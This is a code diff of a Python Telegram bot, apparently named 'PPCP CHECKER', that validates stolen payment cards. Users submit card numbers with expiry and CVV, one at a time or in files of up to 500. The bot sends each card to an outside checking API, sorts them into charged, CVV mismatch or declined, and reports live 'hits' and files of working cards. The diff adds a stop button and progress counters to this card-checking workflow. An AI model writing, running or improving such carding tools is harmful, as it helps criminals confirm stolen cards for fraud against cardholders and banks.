@@ -16,46 +16,40 @@ ADMIN_ID  = 6601184733
 API_URL   = 'https://ppcp.rudochk.com/check'
 MAX_FILE  = 500
 
-PREMIUM_EMOJI_IDS = {
+bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)
+USERS_FILE  = 'ppcp_users.json'
+active_jobs = {}
+
+EMOJIS = {
     "✅": "5123163417326126159",
     "❌": "5121063440311386962",
     "🔥": "5116414868357907335",
-    "⚡": "5219943216781995020",
     "💳": "5447453226498552490",
     "💠": "5870498447068502918",
     "📝": "5444860552310457690",
     "🌐": "5447602197439218445",
     "📊": "4911241630633165627",
     "📦": "5303102515301083665",
-    "📋": "5305618829265628111",
     "⏳": "5303382628773161521",
     "🚀": "5303534082204920602",
     "⚠️": "5305473345838410805",
     "💎": "5305726937887433606",
     "👋": "5134653266591744867",
     "💡": "5231264265242954153",
-    "📈": "5134457377428341766",
-    "🔌": "5305622454218024328",
-    "⭐": "5801104080646444587",
     "👑": "5303547611351902889",
-    "🔍": "5305346287820895195",
-    "💥": "5122933683820430249",
-    "🆔": "5447311106030726740",
     "👤": "5445174334031166029",
-    "📅": "5082628525303792441",
-    "🔄": "5454245266305604993",
     "🏦": "5303159080020372094",
-    "💰": "5303159080020372094",
+    "💰": "5373143087065423058",
+    "💥": "5122933683820430249",
+    "🛑": "5373143087065423058",
+    "📁": "5305618829265628111",
 }
 
-def pe(text):
-    """Wrap emojis with Telegram premium animated emoji tags."""
-    for emoji, eid in PREMIUM_EMOJI_IDS.items():
-        text = text.replace(emoji, f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>')
-    return text
-
-bot = telebot.TeleBot(BOT_TOKEN, num_threads=10)
-USERS_FILE = 'ppcp_users.json'
+def e(emoji):
+    eid = EMOJIS.get(emoji)
+    if eid:
+        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
+    return emoji
 
 def load_users():
     if os.path.exists(USERS_FILE):
@@ -80,23 +74,23 @@ def require_approval(fn):
     def wrapper(msg):
         if not is_approved(msg.from_user.id):
             send_safe(msg.chat.id,
-                "𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗 🚫\n\n"
-                "You don't have access to this bot.\n"
-                "Use /request to apply for access.")
+                f"{e('❌')} <b>ACCESS DENIED</b>\n\n"
+                f"You need access to use this bot.\n"
+                f"Use /request to apply.",
+                parse_mode='HTML')
             return
         return fn(msg)
     return wrapper
 
 user_cooldowns = {}
 
-def check_cooldown(chat_id, kind):
-    now   = time.time()
-    limit = 5 if kind == 'chk' else 15
-    last  = user_cooldowns.get(f"{chat_id}_{kind}", 0)
-    diff  = now - last
-    if diff < limit:
-        return False, int(limit - diff) + 1
-    user_cooldowns[f"{chat_id}_{kind}"] = now
+def check_cooldown(chat_id):
+    now  = time.time()
+    last = user_cooldowns.get(chat_id, 0)
+    diff = now - last
+    if diff < 5:
+        return False, int(5 - diff) + 1
+    user_cooldowns[chat_id] = now
     return True, 0
 
 def send_safe(chat_id, text, **kw):
@@ -150,8 +144,7 @@ def check_card(card):
         r = requests.post(API_URL, headers=headers,
                           data=json.dumps({"card": card}),
                           verify=False, timeout=65)
-        text = r.text.strip()
-        if not text:
+        if not r.text.strip():
             return {'status': 'DEAD', 'card': card, 'message': 'Empty response', 'price': ''}
         try:
             data = r.json()
@@ -163,54 +156,62 @@ def check_card(card):
             'message': data.get('message', ''),
             'price':   data.get('price', ''),
         }
-    except Exception as e:
-        return {'status': 'DEAD', 'card': card, 'message': f'Error: {str(e)[:50]}', 'price': ''}
+    except Exception as ex:
+        return {'status': 'DEAD', 'card': card, 'message': f'Error: {str(ex)[:50]}', 'price': ''}
 
 def fmt_result(result, card_info, username='User'):
     status = result['status']
-    price  = f" | 💰 {result['price']}" if result['price'] else ''
+    price  = f" | {e('💰')} {result['price']}" if result['price'] else ''
 
     if 'CHARGED' in status:
-        icon, label = '💎', 'Charged'
+        icon  = e('💎')
+        label = 'CHARGED'
     elif 'CCN' in status:
-        icon, label = '⚠️', 'CVV Mismatch'
+        icon  = e('⚠️')
+        label = 'CVV MISMATCH'
     else:
-        icon, label = '❌', 'Declined'
+        icon  = e('❌')
+        label = 'DECLINED'
 
-    return pe(
-        f"{icon} <b>{label}</b>\n"
-        f"<blockquote>💳 Card: <code>{result['card']}</code></blockquote>"
-        f"<blockquote>📝 Response: {result['message']}{price}</blockquote>"
-        f"<blockquote>🌐 Gateway: 🔥 PPCP</blockquote>"
-        f"<blockquote>🏦 Bank: {card_info.get('flag','🌍')} {card_info.get('bank','Unknown')} | {card_info.get('country','Unknown')}</blockquote>"
-        f"<blockquote>💠 Info: {card_info.get('brand','Unknown')} - {card_info.get('type','Unknown')} - {card_info.get('level','Unknown')}</blockquote>"
-        f"<blockquote>👤 By: @{username}</blockquote>"
+    return (
+        f"{icon} <b>{label}</b>\n\n"
+        f"{e('💳')} <b>Card</b> → <code>{result['card']}</code>\n"
+        f"{e('📝')} <b>Response</b> → {result['message']}{price}\n"
+        f"{e('🌐')} <b>Gateway</b> → {e('🔥')} PPCP\n"
+        f"{e('🏦')} <b>Bank</b> → {card_info.get('flag','🌍')} {card_info.get('bank','Unknown')} | {card_info.get('country','Unknown')}\n"
+        f"{e('💠')} <b>Info</b> → {card_info.get('brand','Unknown')} - {card_info.get('type','Unknown')} - {card_info.get('level','Unknown')}\n"
+        f"{e('👤')} <b>By</b> → @{username}"
     )
 
+def stop_btn(chat_id):
+    m = types.InlineKeyboardMarkup()
+    m.add(types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{chat_id}"))
+    return m
 
 @bot.message_handler(commands=['start'])
 def cmd_start(msg):
     uid = msg.from_user.id
     if not is_approved(uid):
         send_safe(msg.chat.id,
-            "𝗣𝗣𝗖𝗣 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 💳\n\n"
-            "You need access to use this bot.\n"
-            "Use /request to apply.")
+            f"{e('💳')} <b>PPCP CHECKER</b>\n\n"
+            f"You need access to use this bot.\n"
+            f"Use /request to apply.",
+            parse_mode='HTML')
         return
 
-    text = pe(
-        "💳 𝗣𝗣𝗖𝗣 𝗖𝗛𝗘𝗖𝗞𝗘𝗥\n\n"
-        "💥 /pchk — Single card check\n"
-        "📦 /pfile — Check cards from file\n"
+    text = (
+        f"{e('💳')} <b>PPCP CHECKER</b>\n\n"
+        f"{e('💥')} /pchk — Single card check\n"
+        f"{e('📦')} /pfile — Check cards from file\n"
     )
     if uid == ADMIN_ID:
-        text += pe(
-            "\n👑 𝗔𝗗𝗠𝗜𝗡\n\n"
-            "👤 /users — Approved users\n"
-            "⏳ /pending — Pending requests\n"
-            "📢 /broadcast — Broadcast message\n"
+        text += (
+            f"\n{e('👑')} <b>ADMIN</b>\n\n"
+            f"{e('👤')} /users — Approved users\n"
+            f"{e('⏳')} /pending — Pending requests\n"
+            f"📢 /broadcast — Broadcast\n"
         )
-    text += pe("\n💡 𝗕𝗼𝘁 𝗕𝘆: @Xyoshy")
+    text += f"\n{e('💡')} <b>Bot By:</b> @Xyoshy"
     send_safe(msg.chat.id, text, parse_mode='HTML')
 
 
@@ -234,11 +235,9 @@ def cmd_request(msg):
         types.InlineKeyboardButton("❌ Deny",    callback_data=f"deny_{uid}")
     )
     send_safe(ADMIN_ID,
-        f"📥 New Access Request\n\n"
-        f"👤 {fname}\n"
-        f"🔗 @{uname}\n"
-        f"🆔 {uid}",
-        reply_markup=markup)
+        f"📥 <b>New Access Request</b>\n\n"
+        f"👤 {fname}\n🔗 @{uname}\n🆔 {uid}",
+        parse_mode='HTML', reply_markup=markup)
     send_safe(msg.chat.id, "📤 Request sent! Waiting for admin approval...")
 
 
@@ -264,10 +263,29 @@ def cb_approval(call):
         send_safe(uid, "🚫 Your request was denied.")
 
 
+@bot.callback_query_handler(func=lambda c: c.data == 'none')
+def cb_none(call):
+    bot.answer_callback_query(call.id)
+
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith('stop_'))
+def cb_stop(call):
+    try:
+        chat_id = int(call.data.split('_')[1])
+        if call.from_user.id == chat_id or call.from_user.id == ADMIN_ID:
+            if chat_id in active_jobs:
+                active_jobs[chat_id]['stop'] = True
+            bot.answer_callback_query(call.id, "🛑 Stopping...")
+        else:
+            bot.answer_callback_query(call.id, "❌ Not your job!")
+    except:
+        pass
+
+
 @bot.message_handler(commands=['pchk'])
 @require_approval
 def cmd_pchk(msg):
-    ok, wait = check_cooldown(msg.chat.id, 'chk')
+    ok, wait = check_cooldown(msg.chat.id)
     if not ok:
         send_safe(msg.chat.id, f"⏳ Wait {wait}s before checking again.")
         return
@@ -276,7 +294,9 @@ def cmd_pchk(msg):
         send_safe(msg.chat.id, "Usage: /pchk card|mm|yy|cvv")
         return
     card = parts[1].strip()
-    status_msg = send_safe(msg.chat.id, f"⏳ Checking...\n💳 {card}")
+    status_msg = send_safe(msg.chat.id,
+        f"{e('⏳')} Checking...\n{e('💳')} <code>{card}</code>",
+        parse_mode='HTML')
     if not status_msg:
         return
     result    = check_card(card)
@@ -290,9 +310,10 @@ def cmd_pchk(msg):
 @require_approval
 def cmd_pfile(msg):
     send_safe(msg.chat.id,
-        f"📁 Send your .txt file\n"
+        f"{e('📁')} Send your .txt file\n"
         f"One card per line: card|mm|yy|cvv\n"
-        f"Max {MAX_FILE} cards.")
+        f"Max {MAX_FILE} cards.",
+        parse_mode='HTML')
 
 
 @bot.message_handler(content_types=['document'])
@@ -302,7 +323,8 @@ def handle_file(msg):
         send_safe(msg.chat.id, "❌ Please send a .txt file.")
         return
 
-    status_msg = send_safe(msg.chat.id, "⏳ Reading file...")
+    status_msg = send_safe(msg.chat.id,
+        f"{e('⏳')} Reading file...", parse_mode='HTML')
     if not status_msg:
         return
 
@@ -310,8 +332,8 @@ def handle_file(msg):
         file_info = bot.get_file(msg.document.file_id)
         file_data = bot.download_file(file_info.file_path)
         cards = [c.strip() for c in file_data.decode('utf-8').splitlines() if c.strip()]
-    except Exception as e:
-        edit_safe(msg.chat.id, status_msg.message_id, f"❌ Error: {e}")
+    except Exception as ex:
+        edit_safe(msg.chat.id, status_msg.message_id, f"❌ Error: {ex}")
         return
 
     if not cards:
@@ -321,8 +343,13 @@ def handle_file(msg):
     if len(cards) > MAX_FILE:
         cards = cards[:MAX_FILE]
 
+    stop_flag = {'stop': False}
+    active_jobs[msg.chat.id] = stop_flag
+
     edit_safe(msg.chat.id, status_msg.message_id,
-        f"⏳ Checking {len(cards)} cards...")
+        f"{e('⏳')} <b>Checking {len(cards)} cards...</b>",
+        parse_mode='HTML',
+        reply_markup=stop_btn(msg.chat.id))
 
     def run():
         results  = []
@@ -332,29 +359,53 @@ def handle_file(msg):
         with ThreadPoolExecutor(max_workers=10) as ex:
             futures = {ex.submit(check_card, card): card for card in cards}
             for i, future in enumerate(as_completed(futures), 1):
+                if stop_flag.get('stop'):
+                    break
                 try:
                     res = future.result()
-                except Exception as e:
+                except Exception as err:
                     card = futures[future]
-                    res  = {'status':'DEAD','card':card,'message':str(e)[:50],'price':''}
+                    res  = {'status':'DEAD','card':card,'message':str(err)[:50],'price':''}
                 results.append(res)
                 if 'CHARGED' in res['status']:
                     charged.append(res)
+                    # Send hit immediately
+                    ci = get_card_info(res['card'].split('|')[0])
+                    send_safe(msg.chat.id,
+                        fmt_result(res, ci, msg.from_user.username or 'User'),
+                        parse_mode='HTML')
                 elif 'CCN' in res['status']:
                     ccn_list.append(res)
-                if i % 20 == 0 or i == len(cards):
-                    edit_safe(msg.chat.id, status_msg.message_id,
-                        f"⏳ Checked {i}/{len(cards)}\n"
-                        f"💎 Charged: {len(charged)} | ⚠️ CCN: {len(ccn_list)}")
 
-        dead = len(results) - len(charged) - len(ccn_list)
+                if i % 5 == 0 or i == len(cards):
+                    dead_count = i - len(charged) - len(ccn_list)
+                    markup = types.InlineKeyboardMarkup(row_width=2)
+                    markup.add(
+                        types.InlineKeyboardButton(f"❌ Failed  {dead_count}", callback_data="none"),
+                        types.InlineKeyboardButton(f"✅ Success  {len(charged) + len(ccn_list)}", callback_data="none"),
+                        types.InlineKeyboardButton(f"📊 Total  {len(cards)}", callback_data="none"),
+                        types.InlineKeyboardButton(f"📋 Left  {len(cards) - i}", callback_data="none"),
+                        types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_{msg.chat.id}"),
+                    )
+                    edit_safe(msg.chat.id, status_msg.message_id,
+                        f"{e('⏳')} <b>Checking {msg.document.file_name}...</b>",
+                        parse_mode='HTML',
+                        reply_markup=markup)
+
+        dead  = len(results) - len(charged) - len(ccn_list)
+        label = "Stopped" if stop_flag.get('stop') else "Done"
+
+        done_markup = types.InlineKeyboardMarkup(row_width=2)
+        done_markup.add(
+            types.InlineKeyboardButton(f"❌ Failed  {dead}", callback_data="none"),
+            types.InlineKeyboardButton(f"✅ Success  {len(charged) + len(ccn_list)}", callback_data="none"),
+            types.InlineKeyboardButton(f"📊 Total  {len(results)}", callback_data="none"),
+            types.InlineKeyboardButton(f"💎 Charged  {len(charged)}", callback_data="none"),
+        )
         edit_safe(msg.chat.id, status_msg.message_id,
-            f"✅ Done!\n\n"
-            f"💎 Charged: {len(charged)}\n"
-            f"⚠️ CCN: {len(ccn_list)}\n"
-            f"❌ Dead: {dead}\n"
-            f"📊 Total: {len(results)}",
-            parse_mode='HTML')
+            f"{e('✅')} <b>{label}!</b>",
+            parse_mode='HTML',
+            reply_markup=done_markup)
 
         ts = datetime.now().strftime('%Y%m%d_%H%M%S')
 
@@ -363,11 +414,12 @@ def handle_file(msg):
             with open(fname, 'w') as f:
                 for r in charged:
                     price = f"  {r['price']}" if r['price'] else ''
-                    f.write(f"CHARGE\n{r['card']}\n{r['message']}{price}\n\n")
+                    f.write(f"CHARGED\n{r['card']}\n{r['message']}{price}\n\n")
             with open(fname, 'rb') as f:
                 bot.send_document(msg.chat.id, f,
-                    caption=f"💎 {len(charged)} Charged Cards",
-                    visible_file_name=fname)
+                    caption=f"{e('💎')} <b>{len(charged)} Charged Cards</b>",
+                    visible_file_name=fname,
+                    parse_mode='HTML')
             os.remove(fname)
 
         if ccn_list:
@@ -378,9 +430,12 @@ def handle_file(msg):
                     f.write(f"CCN\n{r['card']}\n{r['message']}{price}\n\n")
             with open(fname, 'rb') as f:
                 bot.send_document(msg.chat.id, f,
-                    caption=f"⚠️ {len(ccn_list)} CCN Cards",
-                    visible_file_name=fname)
+                    caption=f"{e('⚠️')} <b>{len(ccn_list)} CCN Cards</b>",
+                    visible_file_name=fname,
+                    parse_mode='HTML')
             os.remove(fname)
+
+        active_jobs.pop(msg.chat.id, None)
 
     threading.Thread(target=run, daemon=True).start()
 
@@ -392,10 +447,10 @@ def cmd_users(msg):
     if not approved_users:
         send_safe(msg.chat.id, "📭 No approved users.")
         return
-    text = "👥 Approved Users\n\n"
+    text = f"{e('👤')} <b>Approved Users</b>\n\n"
     for i, uid in enumerate(approved_users, 1):
-        text += f"{i}. {uid}\n"
-    send_safe(msg.chat.id, text)
+        text += f"{i}. <code>{uid}</code>\n"
+    send_safe(msg.chat.id, text, parse_mode='HTML')
 
 
 @bot.message_handler(commands=['pending'])
@@ -405,10 +460,10 @@ def cmd_pending(msg):
     if not pending_requests:
         send_safe(msg.chat.id, "📭 No pending requests.")
         return
-    text = "⏳ Pending Requests\n\n"
+    text = f"{e('⏳')} <b>Pending Requests</b>\n\n"
     for uid, info in pending_requests.items():
-        text += f"👤 {info['name']} | @{info['username']} | {uid}\n"
-    send_safe(msg.chat.id, text)
+        text += f"👤 {info['name']} | @{info['username']} | <code>{uid}</code>\n"
+    send_safe(msg.chat.id, text, parse_mode='HTML')
 
 
 @bot.message_handler(commands=['broadcast'])
@@ -431,10 +486,10 @@ def cmd_broadcast(msg):
 
 
 if __name__ == '__main__':
-    print("💳 Bot Started!")
+    print("💳 Bot started!")
     while True:
         try:
             bot.infinity_polling(timeout=60, long_polling_timeout=60)
-        except Exception as e:
-            print(f"Crashed: {e}, restarting in 5s...")
+        except Exception as ex:
+            print(f"Crashed: {ex}, restarting in 5s...")
             time.sleep(5)
